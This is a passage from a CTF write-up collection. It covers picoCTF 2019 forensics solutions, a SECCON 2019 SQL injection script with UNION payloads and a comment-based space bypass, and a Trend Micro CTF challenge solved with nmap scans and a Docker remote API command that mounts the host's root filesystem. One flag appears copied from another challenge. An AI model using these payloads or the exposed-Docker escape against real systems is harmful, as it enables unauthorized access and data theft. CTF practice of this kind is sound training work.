</code></pre><p>Open the file and see the flag.<h2><a class=header href=#flag-15 id=flag-15>Flag</a></h2><p><code>picoCTF{now_you_know_about_extensions}</code><h1><a class=header href=#picoctf19-shark-wire id=picoctf19-shark-wire>PicoCTF19 Shark Wire</a></h1><h2><a class=header href=#challenge-16 id=challenge-16>Challenge</a></h2><p>We found this packet <a href=https://2019shell1.picoctf.com/static/ae9ca8cff43ed638ed5d137f9ece7455/capture.pcap>capture</a>. Recover the flag. You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620.<h2><a class=header href=#hints-14 id=hints-14>Hints</a></h2><p>Try using a tool like Wireshark.<p>What are streams?<h2><a class=header href=#solution-16 id=solution-16>Solution</a></h2><p><code>Analyze > Follow UDP Stream</code><p>Amazingly, it was Stream #6<h2><a class=header href=#flag-16 id=flag-16>Flag</a></h2><p><code>picoCTF{StaT31355_636f6e6e}</code><h2><a class=header href=#helpful-tools id=helpful-tools>Helpful tools</a></h2><p><a href=https://networksecuritytools.com/list-wireshark-display-filters/>https://networksecuritytools.com/list-wireshark-display-filters/</a><h2><a class=header href=#other-solution id=other-solution>Other solution</a></h2><pre><code class=language-python>#!/usr/bin/env python
from scapy.all import *
&quot;&quot;&quot;
We found this packet capture. Recover the flag. 
You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620.
&quot;&quot;&quot;
a = rdpcap('capture.pcap')
flag = []
for i in a[UDP]:
    try:
        if i[IP].src == '10.0.0.2' and i[IP].dst == '10.0.0.12':
            flag.append((i[Raw].load).decode())
    except IndexError:
        continue
print(&quot;&quot;.join(flag))
</code></pre><h1><a class=header href=#picoctf19-whitepages id=picoctf19-whitepages>PicoCTF19 WhitePages</a></h1><h2><a class=header href=#challenge-17 id=challenge-17>Challenge</a></h2><p>I stopped using YellowPages and moved onto WhitePages... but <a href=https://2019shell1.picoctf.com/static/e134178261c6fa36e9058d5408118dd9/whitepages.txt>the page they gave me</a> is all blank!<h2><a class=header href=#hints-15 id=hints-15>Hints</a></h2><p>None<h2><a class=header href=#solution-17 id=solution-17>Solution</a></h2><pre><code class=language-bash>$ file whitepages.txt
whitepages.txt: UTF-8 Unicode text, with very long lines, with no line terminators
$ du -sh *
4.0K    whitepages.txt
</code></pre><p>Opening with notepad makes it seem empty, so try a <a href=https://hex-works.com/eng>hex editor</a>.<p>Seeing repeating patterns of <code>E2 80 83</code> and <code>20</code><pre><code class=language-python>s = 'E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 20 20 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 20 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20'
s = s.replace('E2 80 83', '0').replace('20', '1').replace(' ', '')
for i in range(0, len(s), 8):
    print(chr(int(s[i:i+8], 2)), end='')
</code></pre><h2><a class=header href=#flag-17 id=flag-17>Flag</a></h2><p><code>picoCTF{not_all_spaces_are_created_equal_dd5c2e2f77f89f3051c82bfee7d996ef}</code><h1><a class=header href=#picoctf19-like1000 id=picoctf19-like1000>PicoCTF19 like1000</a></h1><h2><a class=header href=#challenge-18 id=challenge-18>Challenge</a></h2><p>This <a href=https://2019shell1.picoctf.com/static/8694f84879d3b7c0dcf775930f4665fc/1000.tar>.tar</a> file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c.<h2><a class=header href=#hints-16 id=hints-16>Hints</a></h2><p>Try and script this, it'll save you alot of time<h2><a class=header href=#solution-18 id=solution-18>Solution</a></h2><p>Assuming it was tar-ed 1000x. The file inside is 999.tar. Countdown<pre><code class=language-bash>#!/bin/bash
for i in {1000..1}
do
   tar -xvf $i.tar
   rm $i.tar
done
</code></pre><p>or<pre><code class=language-python>import tarfile

for i in range(1000,0,-1):
    tarfile.open(str(i) + '.tar').extractall()
</code></pre><h2><a class=header href=#flag-18 id=flag-18>Flag</a></h2><p><code>picoCTF{StaT31355_636f6e6e}</code><h1><a class=header href=#web id=web>Web</a></h1><p>Placeholder for web resources<h1><a class=header href=#seccon19-web-search id=seccon19-web-search>SECCON19 Web Search</a></h1><p>Get a hidden message! Let's find a hidden message using the search system on the site.<p><a href=http://web-search.chal.seccon.jp/>http://web-search.chal.seccon.jp/</a><pre><code class=language-python>import requests

query = &quot;1' UNION SELECT * FROM (SELECT 10)A JOIN (SELECT @@version)B JOIN (SELECT 10)C#&quot; # 10.4.8-MariaDB-1:10.4.8+maria~bionic
query = &quot;1' UNION SELECT * FROM (SELECT 10)A JOIN (SELECT database())B JOIN (SELECT database())C#&quot; # seccon_sqli
query = &quot;1' UNION SELECT * FROM (select table_name from infoorrmation_schema.tables)A JOIN (SELECT 5)B JOIN (SELECT 5)C#&quot;
#query = &quot;1' UNION SELECT * FROM (select column_name from infoorrmation_schema.columns where table_name = 'articles')A JOIN (SELECT 5)B JOIN (SELECT 5)C#&quot;
#query = &quot;1' UNION SELECT * FROM (select description from articles)A JOIN (SELECT 5)B JOIN (SELECT 5)C#&quot;
#query = &quot;1' UNION SELECT * FROM (select * from flag)A JOIN (SELECT 5)B JOIN (SELECT 5)C#&quot;

query = query.replace(&quot; &quot;, &quot;/**/&quot;)
q = {&quot;q&quot;: query}
res = requests.get(&quot;http://web-search.chal.seccon.jp&quot;, params=q)
print(res.text)
</code></pre><h2><a class=header href=#flag-19 id=flag-19>Flag</a></h2><p>I forgot to write the flag down here.<h1><a class=header href=#containers id=containers>Containers</a></h1><p>Please assess the security of our new web app. The staging environment for our new app is on: 10.0.111.[100 + your_team_number]<hr><p>nmap -sV --script=http-php-version -Pn 10.0.106.6 --dns-servers 192.168.100.1<p>[localhost tmctf2019-finals]$ nmap -p- -Pn 10.0.111.106 --dns-servers 192.168.100.1
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 18:18 PST
Nmap scan report for 10.0.111.106
Host is up (0.00076s latency).
Not shown: 65532 filtered ports
PORT STATE SERVICE
113/tcp closed ident
8000/tcp open http-alt
8080/tcp open http-proxy<p>Nmap done: 1 IP address (1 host up) scanned in 119.35 seconds<hr><p>(env-py2) [localhost tmctf2019-finals]$ nmap -sV -sC -Pn 10.0.111.106 --dns-servers 192.168.6.1<br>Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 21:57 PST
Nmap scan report for 10.0.111.106
Host is up (0.00054s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
113/tcp closed ident
8000/tcp open http Ajenti http control panel
|<em>http-title: Quality containers - Homepage
8080/tcp open http-proxy Docker/19.03.4 (linux)
| fingerprint-strings:
| FourOhFourRequest, GetRequest:
| HTTP/1.0 404 Not Found
| Content-Type: application/json
| Date: Sun, 24 Nov 2019 05:57:42 GMT
| Content-Length: 29
| {"message":"page not found"}
| GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie:
| HTTP/1.1 400 Bad Request
| Content-Type: text/plain; charset=utf-8
| Connection: close
| Request
| HTTPOptions:
| HTTP/1.0 200 OK
| Api-Version: 1.40
| Docker-Experimental: false
| Ostype: linux
| Server: Docker/19.03.4 (linux)
| Date: Sun, 24 Nov 2019 05:57:42 GMT
|</em> Content-Length: 0
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Docker/19.03.4 (linux)
|_http-title: Site doesn't have a title (application/json).<hr><p>DOCKER_HOST=tcp://10.0.111.106:8080 docker run -it -v /:/app ubuntu:latest<hr><p>/home/ctf/container-bridge/populate.py: flag = 'TMCTF{muggedby2candies!}'</main><nav class=nav-wrapper aria-label="Page navigation"><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"></nav></div><script>window.playpen_copyable=true;</script><script src=elasticlunr.min.js></script><script src=mark.min.js></script><script src=searcher.js></script><script src=clipboard.min.js></script><script src=highlight.js></script><script src=book.js></script><script src=theme/mermaid.js></script><script>window.addEventListener('load',function(){window.setTimeout(window.print,100);});</script>